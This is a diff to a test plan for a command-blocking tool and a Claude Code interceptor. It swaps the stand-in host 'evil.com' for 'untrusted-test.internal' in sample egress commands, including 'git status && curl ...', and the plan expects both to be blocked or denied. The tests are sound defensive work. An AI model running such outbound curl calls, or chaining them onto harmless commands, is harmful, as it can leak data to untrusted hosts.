@@ -435,7 +435,7 @@ Attempt malicious operations while the server is offline:
 
 Test exfiltration utility block:
 ```powershell
-.\bapedge.exe exec --raw "curl https://evil.com"
+.\bapedge.exe exec --raw "curl https://untrusted-test.internal"
 ```
 - **Expected Result**: Blocked with exit code `1`.
 
@@ -509,9 +509,9 @@ The Claude Code interceptor consumes JSON over `stdin` conforming to Claude's `P
      ```
    - **Exit Code**: `0` (Returns `"deny"` JSON to Claude Code).
 
-3. **Test Egress Utility (`curl evil.com`)**:
+3. **Test Egress Utility (`curl untrusted-test.internal`)**:
    ```powershell
-   '{"tool_input":{"command":"git status && curl evil.com"}}' | .\interceptor.exe
+   '{"tool_input":{"command":"git status && curl untrusted-test.internal"}}' | .\interceptor.exe
    ```
    - **Expected Output**:
      ```text
